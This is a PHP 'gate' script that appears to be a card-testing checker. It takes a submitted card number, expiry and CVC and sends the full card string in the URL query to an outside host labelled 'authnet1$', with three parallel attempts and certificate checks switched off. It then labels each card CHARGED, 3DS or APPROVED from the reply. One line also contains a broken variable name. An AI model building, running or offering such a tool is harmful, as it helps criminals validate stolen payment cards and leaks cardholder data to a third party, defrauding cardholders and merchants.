<?php
// /gate/authnet1$.php
// Uses require_once validkey.php + validateApiKey()

// === VALIDATE API KEY FIRST ===
require_once __DIR__ . '/validkey.php';

if (!validateApiKey()) {
    exit; // validkey.php already sent JSON error + 401
}

// === NOW PROCEED WITH CARD PROCESSING ===
ini_set('display_errors', 0);
error_reporting(0);

if (!isset($_POST['card']['number'], $_POSTDist['card']['exp_month'], $_POST['card']['exp_year'], $_POST['card']['cvc'])) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card data']);
    exit;
}

$card_number = trim($_POST['card']['number']);
$exp_month = str_pad($_POST['card']['exp_month'], 2, '0', STR_PAD_LEFT);
$exp_year = $_POST['card']['exp_year'];
$cvc = trim($_POST['card']['cvc']);

if (!is_numeric($card_number) || strlen($card_number) < 13 || strlen($card_number) > 19) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid card number']);
    exit;
}

if (strlen($exp_year) === 2) {
    $exp_year = (intval($exp_year) <= 50 ? '20' : '19') . $exp_year;
} elseif (strlen($exp_year) !== 4 || !is_numeric($exp_year)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid year']);
    exit;
}

$expiry = strtotime("$exp_year-$exp_month-01");
if (!$expiry || $expiry < time()) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Card expired']);
    exit;
}

$cc = "$card_number|$exp_month|$exp_year|$cvc";
$api_url_base = 'https://rockyalways.onrender.com/gateway=authnet1$/key=rockysoon?cc=';

// === PARALLEL REQUESTS ===
$responses = [];
$mh = curl_multi_init();
$handles = [];

for ($i = 0; $i < 3; $i++) {
    $url = $api_url_base . urlencode($cc) . "&attempt=$i&rand=" . mt_rand();
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    curl_multi_add_handle($mh, $ch);
    $handles[] = $ch;
}

$running = null;
do {
    curl_multi_exec($mh, $running);
    curl_multi_select($mh);
} while ($running > 0);

foreach ($handles as $ch) {
    $resp = curl_multi_getcontent($ch);
    if ($resp) $responses[] = $resp;
    curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);

if (empty($responses)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Gateway timeout']);
    exit;
}

$best = ['status' => 'DECLINED', 'message' => 'No response'];
foreach ($responses as $resp) {
    $data = json_decode($resp, true);
    if ($data && isset($data['status'], $data['message'])) {
        $best = $data;
        break;
    }
    $best = ['status' => 'DECLINED', 'message' => trim($resp)];
}

$msg = strtolower($best['message'] ?? '');
$status = 'DECLINED';

if (strpos($msg, 'approved') !== false || strpos($msg, 'success') !== false) {
    $status = 'CHARGED';
} elseif (strpos($msg, '3d') !== false || strpos($msg, 'authentication') !== false) {
    $status = '3DS';
} elseif (strpos($msg, 'cvv') !== false || strpos($msg, 'cvc') !== false) {
    $status = 'APPROVED';
}

$finalMsg = $best['message'] . ' (' . ($best['status'] ?? 'UNKNOWN') . ') [Processed: ' . date('Y-m-d H:i:s') . ']';

header('Content-Type: application/json');
echo json_encode([
    'status' => $status,
    'message' => $finalMsg,
    'processed_at' => date('Y-m-d H:i:s')
]);
?>
